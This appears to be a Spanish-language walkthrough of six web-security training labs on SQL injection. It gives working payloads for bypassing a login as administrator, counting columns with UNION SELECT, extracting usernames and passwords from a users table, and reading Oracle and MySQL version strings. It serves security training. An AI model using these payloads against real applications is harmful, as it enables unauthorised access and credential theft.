
## LAB 1

Es un simple login que nos piden que accedamos como administrator, para ello usamos lo siguiente:

```
administrator'-- -
```

La primera comilla cierra el campo username y con el comentario obvia el resto de la consulta

## LAB 2

En este lab nos piden que determinemos el numero de columnas para ello primero lo determinamos con un order by para posteriormente hacer:

```
'union select NULL,NULL,NULL -- -
```

## LAB 3

Nos piden que inyectemos una cadena de texto para ello con la consulta anterior deberemos fuzzear los parametros hasta ver donde podemos inyectar la cadena:

```
'UNION select NULL,'n5dC86',NULL-- -
```

## LAB 4

En este caso, nos piden que tratemos de obtener los credenciales para el usuario administrator, para ello deberemos de conocer el numero de columnas y que campos son inyectables:
`'+UNION+SELECT+'abc','def'--`

Una vez visto eso simplemente con la siguiente consulta nos leakeara la password de administrator:

```
'+UNION+SELECT+username,+password+FROM+users--
```

## LAB 5

Como en los anteriores labs necesitaremos conocer las columnas y cuales de ellas son inyectables, aqui nos piden que descubramos la version en ORACLE:

```
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```

## LAB 6

Este lab es igual que el anterior pero nos piden la version para MYSQL:

```
'+UNION+SELECT+@@version,+NULL#
```

